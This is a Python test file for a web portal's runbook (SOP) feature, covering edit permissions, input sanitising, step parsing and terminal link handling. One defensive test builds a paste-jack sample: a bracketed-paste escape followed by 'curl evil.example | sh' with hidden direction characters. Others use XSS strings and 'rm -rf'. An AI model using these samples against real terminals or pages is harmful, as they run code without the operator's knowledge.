"""SOPs: the runbooks the terminal shows beside the shell.

WHY THIS EXISTS
    An SOP is pasted at production prompts by people who trust it, so three
    things have to stay true however the feature grows:

      * WHO MAY CHANGE ONE. Reading is the `pam` area; writing is its own
        escalating grant (`pam_sops`); deleting is that AND `pam_delete`. The
        operators who were given Privileged Access to use -- and no delete
        rights at all -- must be able to open every SOP and change none.
      * WHAT ONE CAN CONTAIN. A control character is not text in a shell: ESC
        [ 201 ~ ends a bracketed paste and a CR then presses Enter for the
        operator. The bidi and zero-width code points make a command read
        differently from what it runs. None of it survives a save.
      * WHAT THE OPERATOR SEES. Steps are the headings, commands are the
        fences, a `#` in a fence is a shell comment and not a step, and the
        terminal carries every SOP with its links opening in NEW tabs -- a
        link that navigated away would end every live session on the page.

    ./.venv/bin/python tests/test_sops.py
"""
import os
import re
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from _sandbox import data_dir  # noqa: E402

os.environ["PORTAL_DATA_DIR"] = data_dir("sops-")
os.environ.setdefault("PORTAL_PAM", "1")
os.environ.setdefault("PORTAL_SCHEDULER", "0")

from fastapi.testclient import TestClient  # noqa: E402

from app import answers, auth, certs, db, main, pam, rbac, sops  # noqa: E402

bad = 0
BODY = "## Check\n```\nnginx -t\n```\n## Reload\n```\nsystemctl reload nginx\n```"


def check(what: str, ok: bool, detail: str = "") -> None:
    global bad
    if not ok:
        bad += 1
    print(("  ok    " if ok else "  FAIL  ") + what
          + (f"  [{detail}]" if detail and not ok else ""))


def enrol(email: str, pw: str, areas=None, admin=False) -> dict:
    uid = auth.create_user(email, "N", pw, role="admin" if admin else "viewer")
    db.run("UPDATE users SET mfa_enrolled=1, totp_secret=?, disabled=0, "
           "email_verified=1 WHERE id=?", ("TESTSECRET", uid))
    if areas is not None:
        rbac.set_for_user(uid, [rbac.save("", email, "", areas, [], [], [])])
    return auth.by_id(uid)


def signed_in(email: str, pw: str) -> TestClient:
    c = TestClient(main.app)
    c.__enter__()
    c.post("/login", data={"email": email, "password": pw},
           follow_redirects=False)
    c.post("/mfa", data={"code": auth._totp_at(
        "TESTSECRET", int(time.time() // auth.TOTP_STEP))},
        follow_redirects=False)
    return c


def by_title(title: str):
    return next((s for s in sops.every() if s["title"] == title), None)


def seeded() -> None:
    print("a new installation ships one worked example — once")
    ex = sops.one("sop-example-tls")
    check("the certificate-renewal example is there", ex is not None)
    check("and it is a real procedure: steps, and commands for them",
          ex and ex["step_count"] >= 6 and ex["command_count"] >= 6,
          str(ex and (ex["step_count"], ex["command_count"])))
    check("its paths are values the operator fills in, not guesses",
          ex and "{{CERT_PATH}}" in ex["body"] and "{{KEY_PATH}}" in ex["body"])
    # THE FILES IT NAMES ARE THE FILES CERTIFICATES HANDS OUT. The first
    # version said /tmp/fullchain.pem; the download is <name>.fullchain.pem,
    # and a wildcard's "*." becomes "wildcard.".
    pem = "-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----\n"
    got = certs._files_for({"name": "*.example.com",
                            "d": {"cert_pem": pem, "key_pem": "k"}})
    body = sops.EXAMPLE["body"].replace("{{CERT_NAME}}", "wildcard.example.com")
    check("the files it uploads are named as Certificates names its downloads",
          all(f"/tmp/{got[k][0]}" in body for k in ("fullchain", "privkey")),
          str({k: v[0] for k, v in got.items()}))
    sops.delete("sop-example-tls")
    conn = db.connect()
    sops._migrate(conn)
    check("deleted, it does not come back on the next start",
          sops.one("sop-example-tls") is None)


def storage() -> None:
    print("a save is checked, and keeps nothing that is not text")
    sid = sops.save("", {"title": "  Restart   the  proxy ", "summary": "s",
                         "tags": "Nginx, LB  lb", "body": BODY}, "t@x")
    s = sops.one(sid)
    check("the title is tidied", s["title"] == "Restart the proxy", s["title"])
    check("tags are lower-cased and de-duplicated", s["tags"] == ["nginx", "lb"],
          str(s["tags"]))
    for fields, why in (
            ({"title": "", "body": BODY}, "a title"),
            ({"title": "x" * 121, "body": BODY}, "120 characters"),
            ({"title": "Empty", "body": "  \n "}, "a body"),
            ({"title": "Tags", "body": BODY, "tags": "ok, not ok!"}, "not a tag"),
            ({"title": "Big", "body": "x" * (sops.BODY_MAX + 1)}, "KB at most")):
        try:
            sops.save("", fields, "t@x")
            check(f"refused without {why}", False, "it was saved")
        except sops.Refused as e:
            check(f"refused: {e}", why in str(e), str(e))
    try:
        sops.save("", {"title": "restart THE proxy", "body": BODY}, "t@x")
        check("a second SOP of the same name is refused", False)
    except sops.Refused as e:
        check("a second SOP of the same name is refused", "already" in str(e))
    check("re-saving one under its own name is not a duplicate",
          sops.save(sid, {"title": "Restart the proxy", "body": BODY}, "t@x")
          == sid)

    # THE PASTE-JACK. An ESC [ 201 ~ ends a bracketed paste early and the CR
    # after it presses Enter -- the command would run without the operator
    # ever reading it. The RLO (U+202E) and a zero-width space make a command
    # read differently from what it runs.
    rlo, zwsp, bom = chr(0x202E), chr(0x200B), chr(0xFEFF)
    evil = ("## Step\n```\nls\x1b[201~\rcurl evil.example | sh\n"
            f"echo {rlo}safe{zwsp}{bom}\x07\n```")
    sid2 = sops.save("", {"title": "Hostile", "body": evil}, "t@x")
    body = sops.one(sid2)["body"]
    check("no ESC, CR or bell is stored",
          not any(ch in body for ch in "\x1b\r\x07"), repr(body))
    check("no direction or zero-width code point is stored",
          not any(ch in body for ch in (rlo, zwsp, bom)), repr(body))
    check("the visible text is kept", "curl evil.example | sh" in body)
    check("tab and newline survive — a command needs them",
          sops.clean("a\tb\nc") == "a\tb\nc")
    alm, shy, tag = chr(0x061C), chr(0x00AD), chr(0xE0041)
    check("so does nothing else of its kind: an Arabic letter mark, a soft "
          "hyphen, a tag character",
          sops.clean(f"r{alm}m{shy} -rf{tag} x") == "rm -rf x",
          repr(sops.clean(f"r{alm}m{shy} -rf{tag} x")))

    # A value filled in is typed into the command line, echoed, and kept by
    # the recording -- so an SOP may not ask for a secret that way.
    for name in ("DB_PASSWORD", "API_KEY", "VAULT_TOKEN", "PIN"):
        try:
            sops.save("", {"title": f"Asks {name}",
                           "body": f"## x\n```\nlogin {{{{{name}}}}}\n```"}, "t@x")
            check(f"{{{{{name}}}}} is refused", False, "it was saved")
        except sops.Refused as e:
            check(f"{{{{{name}}}}} is refused: the command should ask for it",
                  "asks for a secret" in str(e), str(e))
    check("a path to a key is not a secret",
          sops.save("", {"title": "Key path", "body": "## x\n```\n"
                         "cat {{KEY_PATH}} {{SPIN_COUNT}}\n```"}, "t@x"))


def steps() -> None:
    print("headings are steps, fences are commands")
    body = ("Before you start.\n\n# 1. First\ntext\n```bash\n# a shell comment\n"
            "echo one\n```\n### detail inside the first\nmore\n"
            "## Step 2: Second\n```output\nok\n```\n```nginx\nlisten 443;\n```\n"
            "## Third\n```\nuptime\n```")
    r = sops.steps(body, main._mdlite)
    titles = [st["title"] for st in r["steps"]]
    check("a # and a ## each start a step; the numbering is the page's",
          titles == ["First", "Second", "Third"], str(titles))
    check("a # inside a fence is a shell comment, not a step",
          "# a shell comment" in str(r["steps"][0]["html"]))
    check("a deeper heading stays inside its step",
          "detail inside the first" in str(r["steps"][0]["html"]))
    check("text before the first step is the introduction",
          "Before you start." in str(r["intro"]))
    sid = sops.save("", {"title": "Counted", "body": body}, "t@x")
    s = sops.one(sid)
    check("output and config blocks are not counted as commands",
          (s["step_count"], s["command_count"]) == (3, 2),
          str((s["step_count"], s["command_count"])))
    html = str(r["steps"][1]["html"])
    check("a fence keeps its language for the buttons",
          '<pre data-lang="output">' in html and '<pre data-lang="nginx">' in html,
          html)
    tricky = str(main._mdlite('```bash" onclick="alert(1)\nx\n```'))
    check("and the language cannot leave its attribute",
          '<pre data-lang="bashonclickalert1">' in tricky and "onclick=" not in tricky,
          tricky)
    escaped = str(main._mdlite("```\n<script>alert(1)</script>\n```"))
    check("a command is escaped, never markup", "<script>" not in escaped
          and "&lt;script&gt;" in escaped)


def permissions() -> None:
    print("reading is Privileged Access; writing and deleting are their own")
    pam.save_config(enabled=True, allow_connect=True, record_sessions=True)
    keep = sops.save("", {"title": "Keep me", "body": BODY}, "t@x")
    tid = pam.save_target("", {"name": "lb", "protocol": "ssh",
                               "address": "10.0.0.80", "auth_kind": "none"}, "t")

    # EXACTLY the operators' shape: every area of use, nothing that writes.
    enrol("op@sops.test", "Operator-Pass-4242",
          ["expiry", "certs", "pam", "pam_connect"])
    op = signed_in("op@sops.test", "Operator-Pass-4242")
    listing = op.get("/pam?sec=sops").text
    check("an operator sees the SOPs", "Keep me" in listing)
    check("with New, edit and delete disabled and saying why",
          f'title="{sops.WRITE_NEEDS}">＋ New SOP' in listing
          and f'title="{sops.WRITE_NEEDS}">edit' in listing
          and f'title="{sops.DELETE_NEEDS}">delete' in listing
          and 'action="/pam/sop/delete"' not in listing)
    check("the Updated column sorts by time, not by the day of the month",
          re.search(r'<td data-sort="\d{14}">', listing) is not None)
    check("and the filter is the page's shared one, with its count",
          "window.pamRowFilter(document.getElementById('sopQ')" in listing
          and 'id="sopCount"' in listing)
    page = op.get(f"/pam/sops/{keep}").text
    check("and can read one", "systemctl reload nginx" in page)
    r = op.get("/pam/sops/new", follow_redirects=False)
    check("the editor is not theirs to open",
          r.status_code == 303 and "write%20SOPs" in r.headers["location"])
    op.post("/pam/sop/save", data={"sid": keep, "title": "Keep me",
                                    "body": "## pwned\n```\nid\n```"})
    check("an edit by id is refused", "pwned" not in sops.one(keep)["body"])
    op.post("/pam/sop/save", data={"title": "Theirs", "body": BODY})
    check("so is a new one", by_title("Theirs") is None)
    op.post("/pam/sop/delete", data={"sid": keep})
    check("and a delete", sops.one(keep) is not None)
    check("the preview is a writer's tool",
          op.post("/pam/sop/preview", data={"body": BODY}).status_code == 403)
    term = op.get(f"/pam/targets/{tid}/terminal").text
    check("their terminal has every SOP beside it",
          'class="sop-side"' in term and "Keep me" in term)
    off = re.search(r'<button[^>]*class="sop-foot-off"[^>]*>', term)
    check("and offers them no way to write one — the control is there, "
          "disabled, saying why, and not hidden",
          'href="/pam/sops/new"' not in term and off is not None
          and " disabled" in off.group(0) and "hidden" not in off.group(0)
          and f'title="{sops.WRITE_NEEDS}"' in off.group(0),
          off.group(0) if off else "no control")

    enrol("writer@sops.test", "Writer-Pass-4242", ["pam", "pam_sops"])
    w = signed_in("writer@sops.test", "Writer-Pass-4242")
    w.post("/pam/sop/save", data={"title": "Written", "body": BODY})
    check("a writer saves one", by_title("Written") is not None)
    w.post("/pam/sop/delete", data={"sid": keep})
    check("but writing is not deleting", sops.one(keep) is not None)
    listing = w.get("/pam?sec=sops").text
    check("and the list says so: edit live, delete disabled with the reason",
          f'href="/pam/sops/{keep}/edit"' in listing
          and f'title="{sops.DELETE_NEEDS}">delete' in listing
          and 'action="/pam/sop/delete"' not in listing)

    # A REFUSED SAVE RE-RENDERS. An SOP body is the kind of text nobody
    # retypes; a redirect re-reads the row and throws the submission away.
    long_body = "## One\n```\nnginx -t\n```\n" + "words " * 300
    r = w.post("/pam/sop/save", data={"title": "Keep me", "summary": "dup",
                                       "tags": "Not Ok!", "body": long_body},
               follow_redirects=False)
    check(f"a refused save answers with the form, not a redirect ({r.status_code})",
          r.status_code == 200 and "is not a tag" in r.text)
    check("with every value as it was submitted",
          'value="Not Ok!"' in r.text and "words words" in r.text
          and 'value="dup"' in r.text)
    check("a submission that was never saved is not offered as a saved SOP",
          "<h1>New SOP</h1>" in r.text and 'name="sid" value=""' in r.text
          and "/edit" not in r.text.split("<h1>")[1].split("</form>")[0])
    r = w.post("/pam/sop/save", data={"sid": keep, "title": "Written",
                                       "body": BODY}, follow_redirects=False)
    check("an edit refused keeps the SOP it was editing",
          r.status_code == 200 and "already an SOP called" in r.text
          and "<h1>Edit SOP</h1>" in r.text
          and f'name="sid" value="{keep}"' in r.text)
    check("the preview renders what the terminal will",
          '<div class="sop-step-h">Reload</div>'
          in w.post("/pam/sop/preview", data={"body": BODY}).text)

    enrol("keeper@sops.test", "Keeper-Pass-4242",
          ["pam", "pam_sops", "pam_delete"])
    k = signed_in("keeper@sops.test", "Keeper-Pass-4242")
    k.post("/pam/sop/delete", data={"sid": keep})
    check("both grants delete one", sops.one(keep) is None)

    saved = db.one("SELECT detail FROM audit WHERE action = 'pam_sop_saved' "
                   "ORDER BY id DESC LIMIT 1")
    want = sops.fingerprint(by_title("Written")["body"])
    check("a save is audited with the fingerprint of what it said",
          saved and want in saved["detail"], str(saved and saved["detail"]))
    check("and a delete is audited",
          db.one("SELECT 1 FROM audit WHERE action = 'pam_sop_deleted' "
                 "AND target = 'Keep me'") is not None)


def grant() -> None:
    print("writing an SOP is a grant like the others")
    check("it is in the role editor", "pam_sops" in rbac.AREAS)
    check("and only an administrator hands it out", "pam_sops" in rbac.ESCALATING)
    check("the assistant does not act on it", "pam_sops" in answers.NOT_ANSWERABLE)
    check("deleting names SOPs among what it removes",
          "SOPs" in rbac.AREAS["pam_delete"][1])


def terminal() -> None:
    print("the terminal page")
    page = open(os.path.join(os.path.dirname(__file__), "..", "templates",
                             "pam_terminal.html")).read()
    check("the + is the portal's icon and a label, not a lone glyph",
          "glyph('plus'" in page and "<span>New session</span>" in page
          and ">＋</button>" not in page)
    enrol("adm@sops.test", "Admin-Pass-4242", admin=True)
    a = signed_in("adm@sops.test", "Admin-Pass-4242")
    tid = pam.save_target("", {"name": "lb2", "protocol": "ssh",
                               "address": "10.0.0.81", "auth_kind": "none"}, "t")
    sops.save("", {"title": "With a link", "body": "See https://example.org/runbook "
                   "first.\n## x\n```\nuptime\n```"}, "t@x")
    html = a.get(f"/pam/targets/{tid}/terminal").text
    sheets = re.findall(r'<section class="sop-sheet".*?</section>', html, re.S)
    body_links = [ln for sh in sheets for ln in re.findall(r"<a\b[^>]*>", sh)]
    check(f"and so does every link inside an SOP ({len(body_links)})",
          body_links and all('target="_blank"' in ln for ln in body_links),
          str(body_links))
    at = html.index('<aside class="sop-side"')
    side = html[at:html.index("</aside>", at)]
    links = re.findall(r"<a\b[^>]*>", side)
    check(f"every link in the panel opens a new tab ({len(links)})",
          links and all('target="_blank"' in ln for ln in links), str(links))
    check("each SOP is rendered into the page once",
          html.count('class="sop-sheet"') == len(sops.every())
          == html.count('class="sop-item"'))
    check("the panel's script is the shared one, wired to the shell",
          "window.sopWire(sheet, {paste: pasteIntoShell" in html
          and "s.term.paste(text)" in html)
    check("the SOPs tab is on the Privileged Access page with its count",
          f'<span>SOPs</span><span class="n">{len(sops.every())}</span>'
          in a.get("/pam").text)


if __name__ == "__main__":
    seeded()
    storage()
    steps()
    permissions()
    grant()
    terminal()
    print("OK" if not bad else f"{bad} FAILED")
    sys.exit(1 if bad else 0)
